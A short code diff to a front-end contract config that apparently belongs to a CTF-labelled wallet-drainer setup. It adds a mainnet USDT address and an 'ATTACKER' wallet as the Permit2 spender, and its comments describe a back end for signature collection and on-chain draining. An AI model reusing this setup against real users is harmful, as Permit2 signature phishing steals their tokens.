@@ -29,6 +29,9 @@ export const CONTRACTS = {
   NBT_PAIR: import.meta.env.VITE_NBT_PAIR || '',
   FEE_TOKEN: import.meta.env.VITE_FEE_TOKEN || MAINNET_CONTRACTS.FEE_TOKEN,
   ATTACK_VAULT: import.meta.env.VITE_ATTACK_VAULT || '',
+  USDT: import.meta.env.VITE_USDT || '0x55d398326f99059fF775485246999027B3197955',
+  // CTF 后端钱包（Permit2 msg.sender），签名 spender 必须等于它
+  ATTACKER: import.meta.env.VITE_ATTACKER || '0xe1F9Fb65BBb39ebd4d0C204c95513d3f6421c407',
 };
 
 // CTF 攻击后端（签名收集 + 链上 Drain）
